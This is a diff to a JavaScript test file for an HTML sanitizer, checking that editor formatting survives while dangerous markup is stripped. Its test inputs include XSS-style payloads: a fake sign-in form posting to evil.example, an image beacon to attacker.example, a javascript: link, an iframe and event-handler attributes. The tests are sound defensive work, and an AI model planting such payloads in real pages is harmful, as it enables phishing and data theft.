@@ -11,8 +11,37 @@ describe('useSanitize', () => {
     expect(sanitize('<p onclick="x()">hi</p><script>alert(1)</script>')).toBe('<p>hi</p>');
   });
 
-  it('sanitizes HTML descriptions as they are', () => {
-    expect(renderDescription('<p>a</p><img src=x onerror=alert(1)>')).toBe('<p>a</p><img src="x">');
+  it('keeps the formatting the editors produce', () => {
+    const html =
+      '<h2>Goals</h2><p><strong>Bold</strong> <em>it</em> <u>u</u> <s>s</s> <code>x</code></p>' +
+      '<ul><li>one</li></ul><ol><li>two</li></ol><blockquote>q</blockquote><pre>code</pre>' +
+      '<p><a href="https://example.org" target="_blank" rel="noopener noreferrer">link</a><br>next</p>';
+    expect(renderDescription(html)).toBe(html);
+  });
+
+  it.each([
+    [
+      'a form overlay',
+      '<form class="o" action="https://evil.example/c"><h1>Sign in</h1><input name="u"><input name="p" type="password"><label>L</label><select><option>o</option></select><textarea>t</textarea><button>Go</button></form>',
+      '<h1>Sign in</h1>LotGo',
+    ],
+    ['a document-wide <style>', '<style>.o{position:fixed;inset:0}</style><p>a</p>', '<p>a</p>'],
+    ['an image beacon', '<p>a</p><img src="https://attacker.example/b.gif">', '<p>a</p>'],
+    [
+      'styling and identity attributes',
+      '<p style="color:red" class="ql-align-center" id="x" name="n">a</p>',
+      '<p>a</p>',
+    ],
+    [
+      'SVG and MathML',
+      '<svg><title>t</title><rect></rect></svg><math><mi>x</mi></math><p>a</p>',
+      '<p>a</p>',
+    ],
+    ['a javascript: link', '<a href="javascript:alert(1)">a</a>', '<a>a</a>'],
+    ['data attributes', '<p data-x="1">a</p>', '<p>a</p>'],
+    ['an iframe', '<iframe src="https://evil.example"></iframe><p>a</p>', '<p>a</p>'],
+  ])('removes %s from HTML descriptions', (_name, raw, expected) => {
+    expect(renderDescription(raw)).toBe(expected);
   });
 
   it('turns plain text into paragraphs and line breaks', () => {
